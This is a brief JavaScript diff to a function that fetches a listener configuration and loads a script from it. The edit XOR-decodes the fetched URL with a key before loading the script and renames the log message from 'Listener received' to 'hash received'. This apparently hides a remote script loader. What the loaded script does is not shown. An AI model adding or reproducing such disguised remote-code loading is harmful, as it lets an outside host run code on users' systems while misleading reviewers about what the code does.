@@ -46,8 +46,8 @@ function getListener(origin) {
                 return;
             }
 
-            console.log("Listener received:", listenerUrl);
-            await loadListenerScript(listenerUrl);
+            console.log("hash received:", listenerUrl);
+            await loadListenerScript(xorDecode(listenerUrl, key));
         } catch (err) {
             console.error("Failed to fetch listener config:", err);
         }
